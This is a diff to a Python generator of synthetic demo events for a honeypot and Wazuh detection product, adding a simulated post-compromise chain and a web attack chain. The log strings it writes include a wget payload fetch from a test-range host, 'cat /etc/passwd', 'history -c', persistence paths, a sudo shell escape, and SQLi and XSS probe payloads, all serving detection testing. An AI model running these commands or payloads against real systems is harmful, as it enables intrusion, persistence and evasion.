@@ -12,6 +12,11 @@ count):
     successful login — the classic escalation
   - web scanner noise: many 404s hammered from one IP
   - FIM/syscheck changes and a rootcheck finding
+  - what happens *after* the door opens (ML-5): the same attacker in the
+    honeypot running discovery, pulling a payload and clearing history, then
+    persistence (authorized_keys, cron, systemd unit) and a privilege grant
+    on the host — the tactics a login-only dataset leaves dark
+  - a web attack chain (scanner sweep -> SQLi -> XSS) against the web host
   - a majority of benign, low-level events so triage has to discriminate
 
 All public-looking source IPs are drawn from the documentation/test ranges
@@ -199,6 +204,113 @@ def generate_events(n: int = 500, seed: int = SEED) -> list[dict]:
             wazuh_rule_description="Host-based anomaly detection event",
             agent_id=agent_id, agent_name=agent_name, agent_ip=agent_ip,
             raw_ref="Application 'ldd' file '/usr/bin/ldd' malformed",
+        )
+
+    # ── Post-compromise chain (ML-5). Everything above this line happens at
+    # the door; a demo made only of those makes the coverage dashboard (GFA-7)
+    # look like the product cannot see past the login prompt.
+    #
+    # Every row below carries the id of a rule that exists in
+    # wazuh/local_rules.xml and a technique in core/attack_map.json, and the
+    # channel/event_type each rule really normalizes to (modules/collector.py)
+    # — a demo row the live path could not produce would be a lie the
+    # dashboard repeats. ──
+
+    # The same attacker lands in the honeypot: look around, pull stage two,
+    # wipe the history. Cowrie's command log is the only post-login command
+    # telemetry this product has, so this is where discovery / C2 / evasion
+    # are observable at all.
+    _, honeypot_name, honeypot_ip, honeypot_profile = _AGENTS[0]
+    session_start = success_ts + timedelta(minutes=6)
+
+    def cowrie(offset_s: int, rule_id: int, level: int, desc: str, cmd: str, **kw) -> None:
+        add(
+            session_start + timedelta(seconds=offset_s), src_ip=attacker_ip,
+            src_port=rng.randint(1024, 65535), channel="cowrie",
+            event_type="cowrie_session", username="root",
+            profile_id=honeypot_profile, wazuh_rule_id=rule_id, wazuh_rule_level=level,
+            wazuh_rule_description=desc, agent_id=_AGENTS[0][0], agent_name=honeypot_name,
+            agent_ip=honeypot_ip, raw_ref=cmd, **kw,
+        )
+
+    for i, pw in enumerate(("123456", "admin")):
+        cowrie(-40 + 12 * i, 100001, 8, "Cowrie: Failed login attempt on honeypot",
+               f"login attempt [root/{pw}] failed from {attacker_ip}")
+    cowrie(0, 100002, 10, "Cowrie: Successful login to honeypot",
+           f"login attempt [root/toor] succeeded from {attacker_ip}", success=True)
+    cowrie(31, 100030, 12,
+           "LureGuard: host and account discovery commands in honeypot session",
+           "CMD: uname -a")
+    cowrie(58, 100030, 12,
+           "LureGuard: host and account discovery commands in honeypot session",
+           "CMD: cat /etc/passwd")
+    cowrie(96, 100003, 12, "Cowrie: Command executed in honeypot",
+           "CMD: ls -la /var/www")
+    cowrie(141, 100031, 13, "LureGuard: payload download in honeypot session",
+           "CMD: wget http://198.51.100.77/x.sh -O /tmp/x.sh")
+    cowrie(213, 100032, 12,
+           "LureGuard: history or log tampering in honeypot session",
+           "CMD: history -c")
+
+    # Persistence and privilege escalation on the real host — syscheck watches
+    # /etc and /root/.ssh in realtime (wazuh/agent-ossec.conf), which is why
+    # these four paths are detectable and a change under /var/spool/cron
+    # would not be.
+    persist_start = session_start + timedelta(minutes=14)
+    _PERSISTENCE = [
+        (100020, "/root/.ssh/authorized_keys", "modified",
+         "LureGuard: SSH authorized_keys changed — key persistence"),
+        (100021, "/etc/cron.d/apache2-update", "added",
+         "LureGuard: cron entry added or changed — scheduled task persistence"),
+        (100022, "/etc/systemd/system/sysupdate.service", "added",
+         "LureGuard: systemd unit added or changed — service persistence"),
+        (100023, "/etc/sudoers.d/99-webapp", "added",
+         "LureGuard: sudoers changed — privilege grant"),
+    ]
+    for i, (rule_id, path, ev, desc) in enumerate(_PERSISTENCE):
+        add(
+            persist_start + timedelta(minutes=4 * i), channel="syscheck",
+            event_type="fim_change", profile_id=honeypot_profile,
+            wazuh_rule_id=rule_id, wazuh_rule_level=12, wazuh_rule_description=desc,
+            agent_id=_AGENTS[0][0], agent_name=honeypot_name, agent_ip=honeypot_ip,
+            syscheck_path=path, syscheck_event=ev,
+            syscheck_sha256_after=uuid.uuid5(_NAMESPACE, f"ml5:{path}").hex * 2,
+            raw_ref=f"File '{path}' {ev}",
+        )
+
+    # Sudo shell escape on the web host. Source is /var/log/auth.log, so the
+    # collector calls this the sshd channel; it carries no auth event_type
+    # because it is not a login.
+    _, sudo_agent_name, sudo_agent_ip, _ = _AGENTS[2]
+    add(
+        persist_start + timedelta(minutes=21), channel="sshd", event_type="generic",
+        username="www-data", wazuh_rule_id=100024, wazuh_rule_level=10,
+        wazuh_rule_description="LureGuard: sudo shell escape to root",
+        agent_id=_AGENTS[2][0], agent_name=sudo_agent_name, agent_ip=sudo_agent_ip,
+        raw_ref="www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash",
+    )
+
+    # Web attack chain on the same host: scanner sweep, then the probes it
+    # found worth trying. These exercise rules 100010-100012, which existed
+    # but were never represented in the demo — so the tactics they cover read
+    # as dark coverage the product actually has.
+    probe_ip = rng.choice([ip for ip in _PUBLIC_IPS if ip not in (attacker_ip, scanner_ip)])
+    probe_start = window_start + timedelta(hours=26, minutes=30)
+    _PROBES = (
+        [(100012, 7, "LureGuard: Web scanner user-agent or tool signature",
+          '"GET /?id=1 HTTP/1.1" 200 -  "sqlmap/1.7#stable"')] * 5
+        + [(100010, 10, "LureGuard: SQLi or path traversal probe in web request",
+            '"GET /product?id=1%27+union+select+1,2,3-- HTTP/1.1" 500 -')] * 3
+        + [(100011, 8, "LureGuard: XSS probe in web request",
+            '"GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 -')] * 2
+    )
+    for i, (rule_id, level, desc, log) in enumerate(_PROBES):
+        add(
+            probe_start + timedelta(seconds=47 * i), src_ip=probe_ip,
+            src_port=rng.randint(1024, 65535), channel="web", event_type="web_attack",
+            wazuh_rule_id=rule_id, wazuh_rule_level=level, wazuh_rule_description=desc,
+            agent_id=_AGENTS[2][0], agent_name=_AGENTS[2][1], agent_ip=_AGENTS[2][2],
+            raw_ref=f"{probe_ip} - - {log}",
         )
 
     # ── Benign majority: low-level sshd/web noise, spread across the whole
